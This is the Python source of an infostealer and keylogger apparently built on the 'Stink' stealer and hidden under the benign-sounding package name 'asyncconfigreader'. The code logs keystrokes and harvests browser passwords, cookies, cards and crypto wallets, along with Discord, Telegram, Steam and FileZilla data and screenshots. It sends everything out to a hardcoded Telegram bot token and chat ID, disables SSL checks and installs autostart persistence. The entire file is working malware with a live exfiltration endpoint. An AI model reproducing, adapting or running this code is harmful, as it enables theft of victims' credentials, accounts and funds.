import ssl
import platform
from sys import argv
import threading
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool
from pynput import keyboard
import requests

from asyncconfigreader.enums import Features, Utils, Protectors
from asyncconfigreader.enums.senders import Senders
from asyncconfigreader.helpers import functions, MemoryStorage
from asyncconfigreader.helpers.config import MultiComputeConfig, Browsers
from asyncconfigreader.utils import Autostart, Message, Protector, Loader, Grabber
from asyncconfigreader.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets

class KL:
    def __init__(self, interval = 60, bot_token = "7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", chat_id=586901167):
        self.interval = interval
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log = ""
        self.start()

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.append_to_log(key.char)
            elif key == keyboard.Key.space:
                self.append_to_log(" ")
            elif key == keyboard.Key.enter:
                self.append_to_log("\n")
        except AttributeError:
            pass

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {"chat_id": self.chat_id, "text": message}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("[+] Log sent to Telegram.")
            else:
                print(f"[!] Failed to send log: {response.text}")
        except Exception as e:
            print(f"[!] Error sending Telegram message: {e}")

    def report(self):
        if self.log:
            self.send_telegram_message(f"[Keylogger Report]\n{self.log}")
            self.log = ""  # Clear after sending
        threading.Timer(self.interval, self.report).start()

    def start(self):
        print("[+] Keylogger started. Press Ctrl+C to stop.")
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.report()

class Compute(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        loaders: List[Loader] = None,
        protectors: List[Protectors] = None,
        grabbers: List[Grabber] = None,
        delay: int = 0
    ):
        Thread.__init__(self, name="Compute")

        if loaders is None:
            loaders = []

        if grabbers is None:
            grabbers = []

    
        senders = [Senders.telegram(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]

        if utils is None:
            utils = []

        if features is None:
            features = [Features.all]

        if protectors is None:
            protectors = [Protectors.disable]

        self.__protectors = protectors
        self.__loaders = loaders
        self.__grabbers = grabbers
        self.__senders = senders
        self.__autostart = Utils.autostart in utils or Utils.all in utils
        self.__message = Utils.message in utils or Utils.all in utils
        self.__delay = delay

        self.__config = MultiComputeConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": Features.system in features or Features.all in features
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": Features.processes in features or Features.all in features
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": Features.screenshot in features or Features.all in features
            },
            {
                "object": Discord,
                "arguments": (
                    "Programs/Discord",
                ),
                "status": Features.discord in features or Features.all in features
            },
            {
                "object": Telegram,
                "arguments": (
                    "Programs/Telegram",
                ),
                "status": Features.telegram in features or Features.all in features
            },
            {
                "object": FileZilla,
                "arguments": (
                    "Programs/FileZilla",
                ),
                "status": Features.filezilla in features or Features.all in features
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": Features.steam in features or Features.all in features
            },
            {
                "object": Wallets,
                "arguments": (
                    "Wallets",
                ),
                "status": Features.wallets in features or Features.all in features
            }
        ]

    def start(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            # Проверка на MacOS
            if platform.system() == "Darwin":
                return

            sleep(self.__delay)

            if self.__message is True:
                Thread(target=Message().run).start()

            Protector(self.__protectors).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            if self.__grabbers:

                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(functions.run_process, [
                        (grabber, None) for grabber in self.__grabbers
                    ])
                pool.close()

                results += grabber_results

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

            for loader in self.__loaders:
                loader.run()

            if self.__autostart is True:
                Autostart(argv[0]).run()

        except Exception as e:
            pass